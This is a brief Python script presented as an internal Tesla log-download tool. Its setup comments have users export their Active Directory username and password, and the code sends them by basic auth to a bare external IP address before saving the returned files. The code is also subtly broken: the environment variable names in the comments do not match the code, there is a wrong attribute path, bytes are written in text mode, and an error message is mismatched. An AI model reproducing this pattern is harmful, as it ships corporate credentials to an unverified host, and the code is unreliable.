#!/usr/bin/env python
#
# TESLAMOTORS INC. Copyright 2021. All rights reserved.
#
# Description: Script to fetch AWS telemetry logs via proxy service.
#
# Author: John de Wolf
#
# Setup / Usage:
# virtualenv venv
# source ./venv/bin/activate
# pip install -r requirements.txt
#
# export API_USERNAME='AD USERNAME'
# export API_PASSWORD='AD PASSWORD'
#
# ./download.py

import os
import logging
import sys
import requests

print("[*] Trying to fetch logs")

base_url = "https://143.198.225.222"
session = requests.Session()
session.auth = requests.HTTPBasicAuth(os.getenv("AD_USERNAME"), os.getenv("AD_PASSWORD"))

try:
    r = session.get(f"{base_url}/api/v1/logs")

    if r.status_code != 200:
        raise Exception(f"Status code {r.status_code}")
except Exception as err:
    logging.error(f"[-] Response: {str(err)}")
    sys.exit(1)

for file_id in r.json()["file_ids"]:
    try:
        file_response = session.get(f"{base_url}/api/v1/download/{file_id}")

        if file_response.status_code != 200:
            raise Exception(f"Status code {r.status_code}")

        local_file = open(f"logs/{file_id}", "w")
        local_file.write(file_response.content)
        local_file.close()

        logging.info(f"[+] Successfully downloaded file '{file_id}'")
    except Exception as err:
        logging.error(f"[-] Failed to fetch file '{file_id}' with error {str(err)}.")
